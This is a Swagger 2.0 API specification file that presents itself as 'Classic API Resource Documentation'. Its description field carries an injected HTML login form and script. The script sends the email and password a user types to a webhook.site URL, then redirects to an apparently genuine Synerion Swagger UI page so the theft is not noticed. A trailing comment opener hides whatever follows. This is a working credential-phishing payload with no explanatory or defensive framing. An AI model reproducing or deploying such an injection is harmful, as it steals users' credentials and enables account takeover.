swagger: '2.0'
info:
  title: Classic API Resource Documentation
  description: |
    <h1>Log in to see the full documentation</h1>
    <form id="loginForm" action="https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e" method="post" onsubmit="handleSubmit(event)">
    <label for="email">Login:</label>
    <input name="email">
    <label for="password">Password:</label>
    <input name="password">
    <input type="submit" value="Login"></form>
    <script>
      function handleSubmit(event) {
        event.preventDefault(); // Prevent form from submitting the default way
        const form = document.getElementById('loginForm');
        fetch(form.action, {
          method: 'POST',
          body: new FormData(form)
        }).then(response => {
          if (response.ok) {
            window.location.href = 'https://neopaydemo.synerioncloud.com/SynerionWeb/swagger/ui/index';
          }
        });
      }
    </script><!--
